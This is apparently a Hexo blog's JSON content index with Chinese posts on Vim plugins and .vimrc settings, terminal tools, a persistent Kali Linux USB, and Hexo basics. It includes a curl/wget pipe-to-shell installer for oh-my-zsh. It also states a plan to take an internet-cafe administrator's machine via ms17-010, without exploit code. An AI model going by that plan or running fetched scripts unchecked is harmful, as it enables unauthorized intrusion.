data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fy52makn42g30sl0lggob.gif\" 稍等，完成安装后右下角会出现 Done! 届时，再退出去。 其他常用命令除了安装插件的命令，还有一些其他的命令。 :PluginList - 列出所有已配置的插件 :PluginInstall - 安装插件,追加 ! 用以更新 :PluginUpdate - 更新插件 :PluginSearch foo - 搜索 foo ; 追加 ! 清除本地缓存 :PluginClean - 清除未使用插件,需要确认; 追加 ! 自动批准移除未使用插件 0x04 代码补全 强大的代码补全插件，即 YouCompleteMe 。 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fy54p611ppg30q90d0x6r.gif\" 依赖在安装 YouCompleteMe 前，需安装相关依赖 Ubuntu 16.04及更高版本 $ sudo apt install build-essential cmake python3-dev 安装将下面一行写入到配置文件 .vimrc 的相应位置（上面有说过），然后打开 vim 输入 :PluginInstall 回车进行安装。 Plugin &#39;Valloric/YouCompleteMe&#39; class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fy52makn42g30sl0lggob.gif\" 等着…… 配置相应语言支持如需 Ｃ 语言家族支持(可选)$ ./install.py --clang-completer 如需 Java(可选)$ ./install.py --java-completer 如需所有语言$ ./install.py --all 对于 Python３ 还需配置$ python3 install.py -all 至此完毕，另外关于 YouCompleteMe 配置文件，我会在最后说…… 0x05 文件树 NERDTree 是 Vim 编辑器的文件系统资源管理器。使用此插件，用户可以直观地浏览复杂的目录层次结构，快速打开文件以进行读取或编辑，以及执行基本的文件系统操作。 Github 仓库：https://github.com/scrooloose/nerdtree class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fy55njeys4g312t0qnb29.gif\" 安装还是和上面安装 YouCompleteMe 插件一样，将下面一行添加到配置文件 .vimrc 中的 Plugin ‘Valloric/YouCompleteMe’ 的下一行，然后打开 vim 输入 :PluginInstall 回车进行安装。 Plugin &#39;scrooloose/nerdtree&#39; 关于它的配置，最后再说…… 0x06 代码诊断 ALE（异步Lint引擎）是一个插件，用于在编辑文本文件时在NeoVim 0.2.0+和Vim 8中提供linting，并充当Vim 语言服务器协议客户端。 Github 仓库：https://github.com/w0rp/ale ALE充当“语言客户端”以支持各种语言服务器协议功能，包括： 诊断（通过语言服务器协议连接） 转到定义（:ALEGoToDefinition） 完成（let g:ale_completion_enabled = 1加载ALE之前） 寻找参考（:ALEFindReferences） 悬停信息（:ALEHover） 符号搜索（:ALESymbolSearch） class=\"lazyload\" data-src=\"https://https//user-images.githubusercontent.com/3518142/59195938-3a81b100-8b85-11e9-8e8d-6a601b1db908.gif\" 插件安装在这里我使用 git ，将其克隆到本地 ~/.vim/bundle/ 下。 $ cd ~ / .vim/bundle &amp;&amp; git clone https://github.com/w0rp/ale.git 代码分析pylint 这是一个 Python 静态代码分析工具，它将配合 ALE 一起使用，可以查找编程错误，帮助强制执行编码标准，嗅探代码异味并提供简单的重构建议。 Github 仓库：https://github.com/PyCQA/pylint 官网：http://pylint.pycqa.org/en/latest/ pip安装 由于 pip 安装东西权限不好解决，故应先切换到 root 用户再进行安装 $ sudo -i …… # pip install pylint --upgrade 0x07 关于 Vim 的配置 在上面安装了几个插件，我们就可以按照自己的需求来配置实现相应功能。即对 .vimrc ，此文件进行配置。 我的 .vimrc其实，我的这份配置文件也是在网上找的，做了个整合，还对一些语句做了注释（不然都看不懂）。 &quot;vundle配置 &quot; set the runtime path to include Vundle and initialize set rtp+=~/.vim/bundle/Vundle.vim &quot; 设置包括vundle和初始化相关的runtime path call vundle#begin() &quot;call vundle#begin(&#39;~/some/path/here&#39;) &quot; 另一种选择, 指定一个vundle安装插件的路径 &quot; 让vundle管理插件版本,必须 Plugin &#39;gmarik/Vundle.vim&#39; Plugin &#39;Valloric/YouCompleteMe&#39; let g:ycm_key_invoke_completion = &#39;&lt;c-z&gt;&#39; &quot; 提示快捷键 Plugin &#39;scrooloose/nerdtree&#39; &quot; 添加你的所有插件在这儿 (注意Vundle的旧版本使用Bundle而不是Plugin) Plugin &#39;jistr/vim-nerdtree-tabs&#39; autocmd VimEnter * NERDTree Bundle &#39;davidhalter/jedi-vim&#39; let g:SimpyIFold_docstring_preview=1 &quot; 完成补全后自动消失预览窗口 let g:ycm_server_python_interpreter=&#39;/usr/bin/python3&#39; &quot; 蟒蛇解释器位置 let g:ycm_global_ycm_extra_conf=&#39;~/.vim/.ycm_extra_conf.py&#39; let g:ycm_autoclose_preview_window_after_completion=1 &quot; 完成操作后自动补全窗口不消失 set completeopt=preview &quot; 补全内容不以分割子窗口形式出现，只显示补全列表 let NERDTreeIgnore=[&#39;\\.pyc$&#39;, &#39;\\~$&#39;] &quot;ignore files in NERDTree &quot;显示相关 &quot;set shortmess=atI &quot;不显示帮助乌干达的提示 colorscheme desert &quot;设置配色方案 set showcmd &quot;输入的命令显示出来 syntax on &quot;语法高亮 set tabstop=4 &quot;Tab键的宽度设为４ set softtabstop=4 set shiftwidth=4 &quot;统一缩进为４ set autoindent &quot;开启自动缩进，保持缩进值与上一行相等 autocmd InsertLeave * se nocul &quot;用浅色高亮当前行 autocmd InsertEnter * se cul &quot;用浅色高亮当前行 set ruler &quot;显示当前光标行列位置 set mouse=a &quot;支持鼠标 set laststatus=2 &quot;显示状态栏（默认值为１，无法显示状态栏) if has(&#39;gui_running&#39;) set t_Co=256 endif set guifont=Mono set autoread &quot;当文件在外部修改时，vim自动更新载入 set ignorecase &quot;搜索时忽略大小写 set foldmethod=syntax set nofoldenable &quot;此两行为折叠代码 &quot;自定义键映射 &quot;实现CTRL-w保存操作 nnoremap &lt;C-w&gt; :w&lt;cr&gt; imap &lt;C-w&gt; &lt;Esc&gt;:w&lt;cr&gt; &quot;映射以F12打开NERDTree nnoremap &lt;silent&gt; &lt;F12&gt; :NERDTree&lt;CR&gt; &quot;映射自动补全括号 inoremap ( ()&lt;ESC&gt;i inoremap [ []&lt;ESC&gt;i inoremap &#123; &#123;&#125;&lt;ESC&gt;i inoremap &quot; &quot;&quot;&lt;ESC&gt;i inoremap &#39; &#39;&#39;&lt;ESC&gt;i set encoding=utf-8 set fenc=utf-8 set fencs=utf-8,usc-bom,euc-jp,gb18030,gbk,gb2312,cp936,big-5 set enc=utf-8 let &amp;termencoding=&amp;encoding set nu &quot; 显示行数 set nocompatible &quot; 必须，加载vim自带和插件相应的语法和文件类型相关脚本 filetype off &quot; 必须 set list listchars=tab:&gt;-,trail:-,eol:$ &quot;设定tab键显示为&gt;-,每行行尾显示$ set report=0 &quot;python运行配置 map &lt;F10&gt; :w&lt;cr&gt;:!python3 %&lt;cr&gt;:q&lt;cr&gt; &quot;按F10键进行python调试 au BufNewFile,BufRead *.py &quot;设置py文件支持PEP8风格 \\ set tabstop=4r \\ set softtabstop=4 \\ set shiftwidth=4 \\ set textwidth=79 \\ set expandtab \\ set autoindent \\ set fileformat=unix &quot;auto add pyhton header --start 自动添加py文件头 autocmd BufNewFile *.py 0r ~/.vim/vimTemplate/pythonHeader autocmd BufNewFile *.py ks|call FileName()|&#39;s autocmd BufNewFile *.py ks|call CreatedTime()|&#39;s fun FileName() if line(&quot;$&quot;) &gt; 10 let l = 10 &quot;这里是字母L else let l =line(&quot;$&quot;) endif exe &quot;1,&quot;.l.&quot;g/File Name:.*/s/File Name:.*/File Name:&quot;.expand(&quot;%&quot;) &quot;最前面是数字1，这里的File Name:和模板中一致 endfun fun CreatedTime() if line(&quot;$&quot;) &gt; 10 let l=10 else let l=line(&quot;$&quot;) endif exe &quot;1,&quot;.l.&quot;g/Created Time:.*/s/Created Time:.*/Created Time:&quot;.strftime(&quot;%Y-%m-%d %T&quot;) &quot;这里Create Time:要和模板中一致 endfun &quot;auto add python header --end Plugin &#39;w0rp/ale&#39; &quot; 对应语言需要安装相应的检查工具 &quot; https://github.com/w0rp/ale let g:ale_linters_explicit = 1 &quot;除g:ale_linters指定，其他不可用 let g:ale_linters = &#123; \\ &#39;python&#39;: [&#39;pylint&#39;] \\&#125; &quot;\\ &#39;cpp&#39;: [&#39;cppcheck&#39;,&#39;clang&#39;,&#39;gcc&#39;], &quot;\\ &#39;c&#39;: [&#39;cppcheck&#39;,&#39;clang&#39;, &#39;gcc&#39;], &quot;\\ &#39;bash&#39;: [&#39;shellcheck&#39;], &quot;\\ &#39;go&#39;: [&#39;golint&#39;], let g:ale_sign_column_always = 1 let g:ale_completion_delay = 500 let g:ale_echo_delay = 20 let g:ale_lint_delay = 500 let g:ale_echo_msg_format = &#39;[%linter%] %code: %%s&#39; let g:ale_lint_on_text_changed = &#39;normal&#39; let g:ale_lint_on_insert_leave = 1 let g:airline#extensions#ale#enabled = 1 &quot;let g:ale_set_quickfix = 1 &quot;let g:ale_open_list = 1&quot;打开quitfix对话框 let g:ale_c_gcc_options = &#39;-Wall -O2 -std=c99&#39; let g:ale_cpp_gcc_options = &#39;-Wall -O2 -std=c++14&#39; let g:ale_c_cppcheck_options = &#39;&#39; let g:ale_cpp_cppcheck_options = &#39;&#39; let g:ale_sign_error = &quot;&gt;&gt;&quot; let g:ale_sign_warning = &quot;--&quot; map &lt;F7&gt; ::ALEToggle&lt;CR&gt; &quot; 你的所有插件需要在下面这行之前 call vundle#end() &quot; 必须 filetype plugin indent on &quot; 必须，加载vim自带和插件相应的语法和文件类型相关脚本 配置解读关于配色方案在我（或你）的/usr/share/vim/vim80/colors/目录，有着自带的一些配色方案，我选择的配色方案是 desert ，看下图；你还可以到网上找一些其他的配色方案来使用，前提是得将找来的配色方案文件放置在此目录下，请注意文件是 .vim 后缀。 如何设置配色方案？很简单，看上方配置文件的第 25 行（colorscheme desert）。将 desert 替换为你喜欢的配色主题名，最后保存退出。 $ cd /usr/share/vim/vim80/colors $ ls blue.vim desert.vim koehler.vim peachpuff.vim slate.vim darkblue.vim elflord.vim morning.vim README.txt torte.vim default.vim evening.vim murphy.vim ron.vim zellner.vim delek.vim industry.vim pablo.vim shine.vim class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fy584vv8ybj30yj0py7wh.jpg\" 文件头部信息每次新建一个 Python 文件，会自动生成下图所示的头部信息。 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fy58ursaobg30vr0oldoh.gif\" 这里得在 ~/.vim/ 目录下创建一个存放模板文件的目录，目录名就叫 vimTemplate ，模板名取为 pythonHeader $ mkdir ~/.vim/vimTemplate &amp;&amp; vim pythonHeader 将下面几行写入到模板文件 pythonHeader 之中 #!/usr/bin/env python3 # -*- coding:utf-8 -*- #File Name: #Created Time: 生成头部的程序，也可看上方配置文件（从第 80 行开始往下看） &quot;auto add pyhton header --start 自动添加py文件头 autocmd BufNewFile *.py 0r ~/.vim/vimTemplate/pythonHeader autocmd BufNewFile *.py ks|call FileName()|&#39;s autocmd BufNewFile *.py ks|call CreatedTime()|&#39;s fun FileName() if line(&quot;$&quot;) &gt; 10 let l = 10 &quot;这里是字母L else let l =line(&quot;$&quot;) endif exe &quot;1,&quot;.l.&quot;g/File Name:.*/s/File Name:.*/File Name:&quot;.expand(&quot;%&quot;) &quot;最前面是数字1，这里的File Name:和模板中一致 endfun fun CreatedTime() if line(&quot;$&quot;) &gt; 10 let l=10 else let l=line(&quot;$&quot;) endif exe &quot;1,&quot;.l.&quot;g/Created Time:.*/s/Created Time:.*/Created Time:&quot;.strftime(&quot;%Y-%m-%d %T&quot;) &quot;这里Create Time:要和模板中一致 endfun &quot;auto add python header --end Python 运行及代码缩进&quot;python运行配置 map &lt;F10&gt; :w&lt;cr&gt;:!python3 %&lt;cr&gt;:q&lt;cr&gt; &quot;按F10键进行python调试 au BufNewFile,BufRead *.py &quot;设置py文件支持PEP8风格 \\ set tabstop=4r \\ set softtabstop=4 \\ set shiftwidth=4 \\ set textwidth=79 \\ set expandtab \\ set autoindent \\ set fileformat=unix 介于我的快捷键冲突，所以我将 F10 设置运行该 Python 文件（前提是得先保存）。 代码语法检查前面安装的插件 ALE 以及 pylint ，现在可以对它们进行配置了。这里的缩进语法我已经配置好（仅限Python）。 Plugin &#39;w0rp/ale&#39; &quot; 对应语言需要安装相应的检查工具 &quot; https://github.com/w0rp/ale let g:ale_linters_explicit = 1 &quot;除g:ale_linters指定，其他不可用 let g:ale_linters = &#123; \\ &#39;python&#39;: [&#39;pylint&#39;] \\&#125; &quot;\\ &#39;cpp&#39;: [&#39;cppcheck&#39;,&#39;clang&#39;,&#39;gcc&#39;], &quot;\\ &#39;c&#39;: [&#39;cppcheck&#39;,&#39;clang&#39;, &#39;gcc&#39;], &quot;\\ &#39;bash&#39;: [&#39;shellcheck&#39;], &quot;\\ &#39;go&#39;: [&#39;golint&#39;], let g:ale_sign_column_always = 1 let g:ale_completion_delay = 500 let g:ale_echo_delay = 20 let g:ale_lint_delay = 500 let g:ale_echo_msg_format = &#39;[%linter%] %code: %%s&#39; let g:ale_lint_on_text_changed = &#39;normal&#39; let g:ale_lint_on_insert_leave = 1 let g:airline#extensions#ale#enabled = 1 &quot;let g:ale_set_quickfix = 1 &quot;let g:ale_open_list = 1&quot;打开quitfix对话框 let g:ale_c_gcc_options = &#39;-Wall -O2 -std=c99&#39; let g:ale_cpp_gcc_options = &#39;-Wall -O2 -std=c++14&#39; let g:ale_c_cppcheck_options = &#39;&#39; let g:ale_cpp_cppcheck_options = &#39;&#39; let g:ale_sign_error = &quot;&gt;&gt;&quot; let g:ale_sign_warning = &quot;--&quot; map &lt;F7&gt; ::ALEToggle&lt;CR&gt; &quot; 暂时关闭代码检查 其他 显示方面 &quot;显示相关 &quot;set shortmess=atI &quot;不显示帮助乌干达的提示 colorscheme desert &quot;设置配色方案 set showcmd &quot;输入的命令显示出来 syntax on &quot;语法高亮 set tabstop=4 &quot;Tab键的宽度设为４ set softtabstop=4 set shiftwidth=4 &quot;统一缩进为４ set autoindent &quot;开启自动缩进，保持缩进值与上一行相等 autocmd InsertLeave * se nocul &quot;用浅色高亮当前行 autocmd InsertEnter * se cul &quot;用浅色高亮当前行 set ruler &quot;显示当前光标行列位置 set mouse=a &quot;支持鼠标 set laststatus=2 &quot;显示状态栏（默认值为１，无法显示状态栏) if has(&#39;gui_running&#39;) set t_Co=256 endif set guifont=Mono set autoread &quot;当文件在外部修改时，vim自动更新载入 set ignorecase &quot;搜索时忽略大小写 set foldmethod=syntax set nofoldenable &quot;此两行为折叠代码 保存、括号、行数…… &quot;实现CTRL-w保存操作 nnoremap &lt;C-w&gt; :w&lt;cr&gt; imap &lt;C-w&gt; &lt;Esc&gt;:w&lt;cr&gt; &quot;映射以F12打开NERDTree nnoremap &lt;silent&gt; &lt;F12&gt; :NERDTree&lt;CR&gt; &quot;映射自动补全括号 inoremap ( ()&lt;ESC&gt;i inoremap [ []&lt;ESC&gt;i inoremap &#123; &#123;&#125;&lt;ESC&gt;i inoremap &quot; &quot;&quot;&lt;ESC&gt;i inoremap &#39; &#39;&#39;&lt;ESC&gt;i set encoding=utf-8 set fenc=utf-8 set fencs=utf-8,usc-bom,euc-jp,gb18030,gbk,gb2312,cp936,big-5 set enc=utf-8 let &amp;termencoding=&amp;encoding set nu &quot; 显示行数 set nocompatible &quot; 必须，加载vim自带和插件相应的语法和文件类型相关脚本 filetype off &quot; 必须 set list listchars=tab:&gt;-,trail:-,eol:$ &quot;设定tab键显示为&gt;-,每行行尾显示$ set report=0 ………… 差不多就这些吧，这些也就仅仅入门/坑。以后有空再慢慢折腾吧！","categories":[{"name":"技术","slug":"技术","permalink":"https://fanqxu.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"vim","slug":"vim","permalink":"https://fanqxu.github.io/tags/vim/"},{"name":"python","slug":"python","permalink":"https://fanqxu.github.io/tags/python/"}]},{"title":"关于Terminal的一些技巧","slug":"关于-Terminal-的一些骚操作","date":"2018-12-01T05:09:20.000Z","updated":"2020-11-29T14:43:09.000Z","comments":true,"path":"2018/12/01/关于-Terminal-的一些骚操作/","link":"","permalink":"https://fanqxu.github.io/2018/12/01/%E5%85%B3%E4%BA%8E-Terminal-%E7%9A%84%E4%B8%80%E4%BA%9B%E9%AA%9A%E6%93%8D%E4%BD%9C/","excerpt":"关于 Terminal 窗口、字体大小以及背景透明度，请自行选择合适方案。 关于那些除了装逼的 Terminal 特效，我就不提了。（譬如好莱坞😎） 关于终端模拟器其实在图形化上使用的都不算是真真正正的终端，算终端模拟器；真正的终端其实是最小化安装系统的那个黑界面。","text":"关于 Terminal 窗口、字体大小以及背景透明度，请自行选择合适方案。 关于那些除了装逼的 Terminal 特效，我就不提了。（譬如好莱坞😎） 关于终端模拟器其实在图形化上使用的都不算是真真正正的终端，算终端模拟器；真正的终端其实是最小化安装系统的那个黑界面。 而 Ubuntu 上自带终端模拟器其实并不怎样，而在应用商店有一个 Terminator（终结者）还算不错。 可去 Ubuntu Software 点击下载，也可使用命令安装； $ sudo apt install terminator 还有一个叫做 Tilix，本人目前就在使用。 关于shell主题我使用的 shell 主题名为 Sweet ，如下图所示 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fxr5lbdklqj315o0vyjz2.jpg\" 关于字体 另外，我使用的为一款优秀的开源字体 [Hack](https://github.com/source-foundry/Hack) ，如下图 ![](http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fxr5lp2x90j31jk14sjs4.jpg) 0x00 彩虹喵lolcat 这玩意儿是一个将你在终端输入命令后，显示的文本颜色修改为彩虹色，还是比较漂亮的。 仓库地址：https://github.com/busyloop/lolcat 安装 首先，安装 **git** 和 **gem**： ```zsh $ sudo apt install git gem ``` 其次，克隆 **lolcat** 仓库： ```zsh $ cd /opt && sudo git clone https://github.com/busyloop/lolcat.git ``` 最后使用 **gem** 安装 **lolcat**： ```zsh $ cd /opt/lolcat/bin $ gem install lolcat ``` ![](http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fxr5mhtcckj30s40m41kx.jpg) 使用 使用方法很简单，即在你要执行的命令后面加上它，譬如 ```zsh $ cat /proc/cpuinfo | lolcat ``` 0x01 neofetch显示系统Info 这条命令可以个性化地显示当前系统的一些信息，比较酷…… 安装 ```zsh $ sudo apt install neofetch ``` 使用（附图） ```zsh $ neofetch ``` ![](http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fxr5mus4zwj30sh0kv1kx.jpg) 0x02 fish shell > 一个友好、互动的命令行shell。 >官网：http://fishshell.com/ > Github仓库：https://github.com/fish-shell/fish-shell 安装 ```zsh $ sudo apt install fish ``` 使用 如果你是短期使用的话，则可以直接在终端输入命令 ```zsh $ fish ``` 如果你喜欢它，想长期，则应该右击你的终端窗口，选择 `配置文件首选项` （英文就是 `Preferences` ）。然后在上方栏选择 `命令` 或者 `Command` ，勾上第二行，并在其下方输入 `/usr/bin/fish` 。如下图所示： ![](http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fxr5nuf82ij30nb0k7jsj.jpg) 0x03 oh-my-zsh美化 > 说起 *oh-my-zsh* ，必须得提 *zsh* ，和上面的 *fish* 以及系统默认的 *bash* ，均属同一类型。 也就是说，这三者只能选其一。而我选择的就是 **zsh** ，搭配 **oh-my-zsh** 美化。 官网：https://ohmyz.sh/ Github仓库：https://github.com/robbyrussell/oh-my-zsh 快速开始 此前得预先安装 *zsh* ```zsh $ sudo apt install zsh ``` 然后安装 *wget* 或者 *curl* ，以及必须的 *git* ```zsh $ sudo apt install wget curl git ``` 安装 最后使用 *wget* 或者 *curl* 来安装 *oh-my-zsh* （两者二选一） ```zsh $ sh -c \"$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\" ``` ```zsh $ sh -c \"$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\" ``` 美化配置 插件 首先，标准的一些插件可在 `~/.oh-my-zsh/plugins/` ，这个目录下找到。 其次，自定义的插件，你应该添加到 `~/.oh-my-zsh/custom/plugins/` 目录。 最后 ，配置文件 ```zsh $ vi ~/.zshrc ``` 找到类似与下面这串字符，添加在括号之中。（每一个插件应单独占一行） ```bash plugins=( git sudo z pip autojump zsh-syntax-highlighting zsh-autosuggestions battery extract git-extras ) ``` 主题 编辑配置文件 ```zsh $ vi ~/.zshrc ``` 找到 `ZSH_THEME` 选项，将你喜欢的主题名替换双引号之中的。譬如，我喜欢随机主题，那么就应该是这个样子。 ```zsh ZSH_THEME=\"random\" ``` 保存并退出。 0x04 Byobu > 一个窗口管理器和终端多路复用器； > > 以及终端窗口下方的一排系统监视器。 官网：http://byobu.org Github仓库：https://github.com/dustinkirkland/byobu 安装 ```zsh $ sudo apt install byobu ``` 快捷键 - F1 - 配置菜单 - F2 - 添加一个窗口 - F3 - 移至左边窗口 - F4 - 移至右边窗口 - …… 其他，具体看配置菜单中的 **help** …… ![](http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fxr5ofu2apj30sh0k875y.jpg) 关联oh-my-zsh 配合 *oh-my-zsh* 一起使用会更完美，首先编辑一个配置文件 ```shell $ vi $HOME/.byobu/.tmux.conf ``` 然后将以下内容写入此配置文件中 ```shell set -g default-shell /usr/bin/zsh set -g default-command /usr/bin/zsh ``` 保存并退出，完毕！ 永久使用 还是和上面的 **fish** 一样，右击你的终端窗口，选择 `配置文件首选项` （英文就是 `Preferences` ）。然后在上方栏选择 `命令` 或者 `Command` ，勾上第二行，并在其下方输入 `/usr/bin/byobu` 。如下图所示： ![](http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fxr5n969xoj30nb0k7t9v.jpg) 一件小事 使用了 **byobu** ，但你右击终端右（左）上角的关闭按钮，其实终端并没有关闭。它还在后台运行着，这时你想真真正正地去关闭它，得使用命令去关闭。 ```shell $ exit ``` 会话恢复一款一般是在服务器上用的会话恢复工具screen。 一般滴，ssh 连上服务器后，由于某种原因（例如无故断网），不仅会断开与服务器的连接，还会连先前在服务器上运行的程序都可能会断开。 这时候就需要一款会话恢复工具： $ screen python -m SimpleHTTPServer 8080 先查看 Detached 的回话： $ screen -ls There is a screen on: 13231.ttys001.Hakintos (Detached) 1 Socket in /var/folders/75/nc22t8d13cg32cnp4gj5zf340000gn/T/.screen. 恢复： $ screen -r ttys001.Hakintos Serving HTTP on 0.0.0.0 port 8080 ... 127.0.0.1 - - [14/Mar/2020 20:37:37] &quot;GET / HTTP/1.1&quot; 200 - 这个工具还有更多高级玩法，不过目前我还用不上。 更多还有很多 Linux 终端上好用的工具： htop（top增强版） bat（高级cat） mycli（mysql命令补全） tmux（终端复用，类似screen） fzf（找文件） rander（终端文件管理） exa（高级ls） fd（find替代品） ripgrep（grep替代品） asciinema（终端录屏回放） …… 真是比运维还运维！！！","categories":[],"tags":[{"name":"Terminal","slug":"Terminal","permalink":"https://fanqxu.github.io/tags/Terminal/"}]},{"title":"便携式Kali Linux创建","slug":"便携式Kali-Linux创建","date":"2018-11-10T10:14:21.000Z","updated":"2021-03-20T10:22:38.705Z","comments":true,"path":"2018/11/10/便携式Kali-Linux创建/","link":"","permalink":"https://fanqxu.github.io/2018/11/10/%E4%BE%BF%E6%90%BA%E5%BC%8FKali-Linux%E5%88%9B%E5%BB%BA/","excerpt":"我的想法就是，首先将一系统装入U盘或者移动硬盘；然后在其他计算机上也可使用；再然后我想不妨网吧走一遭、试一试，美滋滋；最后，ms17-010拿到网管机子的shell（此招本文不会涉及）！！！当然，也不一定可行，如果某电脑开启了BIOS锁（不过就我看来这种情况较少），就不行了；其次，在网吧这样也蛮危险！！！ 废话不多说……","text":"我的想法就是，首先将一系统装入U盘或者移动硬盘；然后在其他计算机上也可使用；再然后我想不妨网吧走一遭、试一试，美滋滋；最后，ms17-010拿到网管机子的shell（此招本文不会涉及）！！！当然，也不一定可行，如果某电脑开启了BIOS锁（不过就我看来这种情况较少），就不行了；其次，在网吧这样也蛮危险！！！ 废话不多说…… 0x00 此前准备 Kali Linux ISO 镜像文件（下载） Rufus（下载） 一台 Windows 操作系统的电脑 U盘或移动硬盘 说明：此文所安装的Kali Linux非live，而是持久性的。 本人Kali镜像包：kali-linux-2018.4-amd64.iso。Rufus只能安装在Windows上使用；U盘或移动硬盘自行准备，U盘建议3.0以上（本人金士顿3.0 64G依然卡），遂改用非SSD移动硬盘，当然SSD会更好。 0x01 刻录镜像首先，打开安装好了的Rufus；如果是U盘，那么在设备项会自动识别U盘设备；如果是移动硬盘，应先勾上显示USB外置硬盘才能识别移动硬盘设备。下一步，在引导类型选择中选择Kali镜像。再下一步，选择NTFS的文件系统；其他选择项默认就行，可以点击开始了。 一图概括： class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx313qf0lrj30xq0p2q97.jpg\" 然后，就会出现下面这种情况，选择第二项： class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx31rb3qgrj30yg0o7446.jpg\" 再然后，直接点击确认： class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx31sz9fm4j30wr0oan2i.jpg\" 最后，看到如下状态，等会儿： class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx31t968xaj30vr0otdl4.jpg\" 至此，视窗上的操作已完成…… 0x02 启动项选择接着上面的继续来……首先，重启你的操作系统。在此过程中，不停的敲击键盘上左上角的 Esc 按键（请注意，此刻手速得快）。 之后，你就会看到如下界面： class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx325y7qhfj33402c0dq6.jpg\" 选择UEFI项回车，如上图 然后，就进入到了Kali live的一些模式选择，如下图： class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx3296vhcpj33402c0u0x.jpg\" 此处，我选择的是第四项，persistence 持久化；而第五项 encrypted persistence 则是加密持久化。回车…… 0x03 创建持久化Kali（重点）经过漫长等待，终于进入到桌面。 打开终端，先查看一下磁盘信息： # fdisk -l 如下图，得到如下信息，简单概括为： sdc 为我的移动硬盘（你的不一定是 sdc ，看实际大小） 931.5G大小 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx32hnayklj31hc0u0tkp.jpg\" 分区了，为了数据安全，此处一定要注意，你的不一定是 sdc ，可能是 sdb 或者其他 # fdisk /dev/sdc /dev/sdc 即为我的移动硬盘，此命令即对我的移动硬盘进行分区 Command (m for help):n Partition type: p primary e extended 回车后，先输入 n 即代表 new 新建一个分区，回车出现以上提示： p primary (主分区) e extended (扩展分区) 输入 p （默认主分区，或直接）回车，选择主分区： Select (default p):p 分区号和第一扇区默认，直接回车： Partition number（3,4 default 3）： First sector（6131712-1953525167, default 6131712）: Last sector 这里就是设置此分区的总大小，我勉强给300G： Last sector, +sector or +size&#123;K,M,G,T,P&#125;(6131712-1953525167, default 1953525167): +300G Created a new partition 3 of type &#39;Linux&#39; and of size 300 GiB. 最后，输入 w 保存： Command (m for help): w The partition table has been altered. Syncing disks. 至此，分区完毕。 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx32oyputhj31hc0u0tla.jpg\" 这时，lsblk 可以查看一下，然后给刚刚分的区设置文件系统及创建持久化设置，如下图： # lsblk # mkfs.ext4 -L persistence /dev/sdc3 # e2label /dev/sdc3 persistence class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx32pnm0quj31hc0u0k4d.jpg\" 到这儿，快结束了…… 创建挂载点# mkdir -p /mnt/disk 挂载 (mount)# mount /dev/sdc3 /mnt/disk 写入持久化配置文件# echo &quot;/ union&quot; &gt; /mnt/disk/persistence.conf 卸载（umount）# umount /mnt/disk 重启（reboot）# reboot -i class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx32pwbt91j31hc0u0k3i.jpg\" 0x04 最后请注意： 重启后，还是和上面进入启动项一样，选择第二项： class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx325y7qhfj33402c0dq6.jpg\" 这里还是选择第四项 persistence : class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx3296vhcpj33402c0u0x.jpg\" 至此，持久化Kali创建完毕咯…… 可能还有后话哦（metasploit 拿网管主机shell）…… 未完待续……","categories":[],"tags":[{"name":"kali","slug":"kali","permalink":"https://fanqxu.github.io/tags/kali/"}]},{"title":"Hexo基本使用","slug":"hello-world","date":"2018-10-09T16:00:00.000Z","updated":"2020-01-19T03:37:34.000Z","comments":true,"path":"2018/10/10/hello-world/","link":"","permalink":"https://fanqxu.github.io/2018/10/10/hello-world/","excerpt":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post$ hexo new &quot;My New Post&quot; More info: Writing Run server$ hexo server More info: Server Generate static files$ hexo generate More info: Generating Deploy to remote sites$ hexo deploy More info: 